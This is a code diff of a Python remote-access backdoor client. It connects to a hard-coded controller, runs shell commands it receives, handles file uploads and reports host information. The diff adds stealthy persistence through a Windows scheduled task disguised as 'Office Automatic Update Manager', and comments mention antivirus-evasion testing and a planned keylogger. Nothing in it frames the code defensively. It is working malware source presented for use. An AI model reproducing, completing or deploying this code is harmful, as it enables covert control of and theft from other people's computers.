@@ -1,15 +1,15 @@
 #use https://antiscan.me
 import datetime, glob, os
 import socket, pickle, time, platform, psutil
-import sys
+import sys, fasteners
 import traceback, subprocess
 
-home = ('192.168.0.224', 5000) #192.168.0.224
+home = ('192.168.0.224', 5000)
 conn = None
-#encryptor = PKCS1_OAEP.new(RSA.import_key(open('pub.pem').read()))
 conn_open = False
 buf_size = 4096
-#maybe use https://stackoverflow.com/questions/26160900/is-there-a-way-to-add-a-task-to-the-windows-task-scheduler-via-python-3 to "add to startup" or run cmds?
+dl = '\\'
+
 def get_size(b, s="B"):
     f = 1024
     for u in ["", "K", "M", "G", "T", "P"]:
@@ -18,7 +18,6 @@ def get_size(b, s="B"):
         b /= f
 
 def send(msg):
-    #msg = encryptor.encrypt(pickle.dumps(msg))
     msg = pickle.dumps({'exit': msg[0], 'msg': msg[1]}, -1)
     conn.sendall(pickle.dumps({'incoming': len(msg)}))
     conn.sendall(msg)
@@ -26,7 +25,15 @@ def send(msg):
 def run(): #todo add keylogger?
     global conn_open, conn
 
-    #todo figure out persistance - schtasks can work but not w/ onlogin
+    lock = fasteners.InterProcessLock('Reserve')
+    if not lock.acquire(timeout=10):
+        return
+
+    try:
+        subprocess.check_output(['schtasks', '/query', '/tn', 'Office Automatic Update Manager'], stderr=subprocess.PIPE)
+    except:
+        task = ['schtasks', '/create', '/sc', 'minute', '/mo', '15', '/f', '/tn', 'Office Automatic Update Manager', '/tr', sys.argv[0]]
+        subprocess.check_output(task, stderr=subprocess.PIPE)
 
     while True:
         if not conn:
@@ -34,12 +41,9 @@ def run(): #todo add keylogger?
 
         try:
             conn.connect(home)
-            #print(f'Client connected to {home[0]}:{home[1]}')
             conn.sendall(pickle.dumps({'name': socket.gethostname()}))
-            #print(f'Sent {socket.gethostname()} to home as nickname')
             server_alive = True
         except:
-            #print('Could not connect to server')
             server_alive = False
             time.sleep(5)
 
@@ -49,7 +53,6 @@ def run(): #todo add keylogger?
                 cmd = pickle.loads(conn.recv(1024))
 
                 if cmd['type'] != 'keepalive':
-                    #(f'Command recieved from {home[0]}:{home[1]}: {cmd}')
                     response = 1, 'Invalid command'
 
                 if cmd['type'] == 'getinfo':
@@ -84,15 +87,6 @@ def run(): #todo add keylogger?
                             response = 0, {'output': result, 'loc': os.getcwd()}
                         except:
                             response = 1, {'output': result, 'loc': os.getcwd()}
-                        ''' live feed of cmd - doesnt work w/ fast output
-                        proc = subprocess.Popen(cmd['cmd'].split(' '), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                        while True:
-                            line = proc.stdout.readline().decode().strip()
-                            if not line:
-                                break
-                            response = 0, {'output': line, 'working': True, 'loc': os.getcwd()}
-                            send(response)
-                        response = 0, {'output': proc.returncode, 'loc': os.getcwd()}'''
                 elif cmd['type'] == 'upload':
                     expected_size = cmd['size']
                     msg = []
@@ -136,10 +130,9 @@ def run(): #todo add keylogger?
                 if response:
                     send(response)
             except:
-                #traceback.print_exc()
+                traceback.print_exc()
                 server_alive = False
                 conn = None
-                #print('Invalid msg from server, assuming server down')
 
 if __name__ == '__main__':
     run()
